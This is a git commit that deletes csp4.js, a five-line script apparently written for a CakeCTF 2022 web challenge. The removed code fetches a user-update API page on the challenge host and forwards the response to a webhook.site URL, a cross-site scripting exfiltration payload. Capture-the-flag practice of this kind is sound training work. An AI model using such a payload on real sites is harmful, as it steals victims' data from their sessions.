0754b44667ad23e97de35441b67f1fc81ccc8fab
Lê Ngọc Hoa <68491164+lengochoa7112000@users.noreply.github.com>
2022-09-04 01:24:57 +0700

    Delete csp4.js

--- csp4.js
+++
@@ -1,5 +0,0 @@
-fetch("http://web1.2022.cakectf.com:8003/api/user/update").then((res) => {
-    return res.text();
-}).then(data => {
-    fetch("https://webhook.site/9fa288a1-051f-42cb-b13f-0e66604e6cf3/?data="+data);
-})
